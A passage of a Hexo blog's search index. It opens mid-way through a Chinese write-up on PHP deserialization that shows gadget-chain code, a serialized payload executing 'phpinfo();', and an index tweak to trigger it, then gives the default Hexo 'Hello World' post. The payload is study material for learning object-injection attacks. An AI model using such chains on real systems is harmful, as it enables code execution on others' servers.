class="hljs-variable">$c0</span>-&gt;num = <span class="hljs-variable">$c1</span>;<br><span class="hljs-variable">$c1</span>-&gt;string = <span class="hljs-variable">$c2</span>;<br><span class="hljs-variable">$c2</span>-&gt;cmd = <span class="hljs-string">&quot;phpinfo();&quot;</span>;<br><span class="hljs-variable">$a</span> = array(<span class="hljs-variable">$c0</span>,<span class="hljs-number">0</span>);<br>echo serialize(<span class="hljs-variable">$a</span>);<br></code></pre></td></tr></table></figure><p>payload</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">a</span>:<span class="hljs-number">2</span>:&#123;<span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>;O:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;cg0&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;num&quot;</span>;O:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;cg1&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;string&quot;</span>;O:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;cg2&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;cmd&quot;</span>;s:<span class="hljs-number">10</span>:<span class="hljs-string">&quot;phpinfo();&quot;</span>;&#125;&#125;&#125;<span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>;<span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>;&#125;<br></code></pre></td></tr></table></figure><p>要将第二个索引改为0</p><p><img src="https://cdn.jsdelivr.net/gh/backk0m/image-bed/image-20240206163502653.png"></p><p>参考文章：<a href="https://xz.aliyun.com/t/11843">https://xz.aliyun.com/t/11843</a>   </p><p>参考视频：<a href="https://www.bilibili.com/video/BV16g411s7CH/?spm_id_from=333.999.0.0&vd_source=414113f33a1cd681c43e79462250b4d0">https://www.bilibili.com/video/BV16g411s7CH/</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>php</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Hello World</title>
    <link href="/2024/02/10/hello-world/"/>
    <url>/2024/02/10/hello-world/</url>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo new <span class="hljs-string">&quot;My New Post&quot;</span><br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo server<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo generate<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo deploy<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
